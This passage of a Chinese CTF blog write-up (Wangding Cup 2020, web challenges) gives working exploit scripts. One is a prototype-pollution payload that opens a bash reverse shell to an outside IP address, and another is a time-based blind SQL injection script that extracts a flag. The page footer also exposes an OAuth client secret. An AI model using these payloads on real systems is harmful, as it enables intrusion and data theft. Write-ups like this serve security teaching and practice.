+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install undefsafe@2.0.2 -S</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510230414796.png" alt="image-20200510230414796"></p>
+<p>然后在题目中试，</p>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510233825972.png" alt="image-20200510233825972"></p>
+<p>然后访问/status</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://503dafc6341d474b969b8cf1f00212de44c78434174f4b4d.cloudgame1.ichunqiu.com:8080/"</span></span><br><span class="line"></span><br><span class="line">re=requests.post(url+<span class="string">'edit_note'</span>,json=&#123;<span class="string">"id"</span>:<span class="string">"__proto__"</span>,<span class="string">"author"</span>:<span class="string">"bash -c \"bash -i &gt;&amp; /dev/tcp/144.34.200.151/6666 0&gt;&amp;1\""</span>,<span class="string">"raw"</span>:<span class="string">"xxx"</span>&#125;)</span><br><span class="line"><span class="keyword">print</span> re.text</span><br><span class="line">re=requests.get(url+<span class="string">'status'</span>,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> re.text</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510233703708.png" alt="image-20200510233703708"></p>
+<h1 id="0x04-trace"><a href="#0x04-trace" class="headerlink" title="0x04 trace"></a>0x04 trace</h1><p>限制只能注册20个账号，可以通过时间盲注，但是过滤了information.schema，用无列名注入，猜的表名是flag,利用exp()整数溢出报错，达到一种既不会注册账号（向数据库插入数据），又可以通过时间注入得到flag。</p>
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510234346894.png" alt="image-20200510234346894"></p>
+<p>同理pow也可以。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into flag value(4,pow(if(1,sleep(3),0)+900,900));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://0c80b72e772d418eaeb6ee0198373cbb589d6f02f80d4359.changame.ichunqiu.com/register_do.php"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">44</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		payload=<span class="string">r"11',exp(if(ascii(mid((select a.2 from (select 1,2 union select * from flag)a limit 1,1),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),1)+1000));-- -"</span></span><br><span class="line">		data=&#123;<span class="string">"username"</span>:payload.format(i,mid),<span class="string">"password"</span>:<span class="string">"ddd"</span>&#125;</span><br><span class="line">		print(payload.format(i,mid))</span><br><span class="line">		s_time=time.time()</span><br><span class="line">		r=requests.post(url,data=data)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">		print(r.content)</span><br><span class="line">		e_time=time.time()</span><br><span class="line">		<span class="keyword">if</span> e_time-s_time&gt;<span class="number">3</span>:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510195425221.png" alt="image-20200510195425221"></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/05/10/2020年网鼎杯writeup/" target="_blank" title="2020年网鼎杯WEB-writeup">http://mount4in.github.io/2020/05/10/2020年网鼎杯writeup/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/" data-id="clg20p5ug001914uv4hqm18oh"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            De1CTF Animal Crossing 复现
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/05/09/De1ctf-pentest2/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">De1ctf Hard_Pentest_2</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
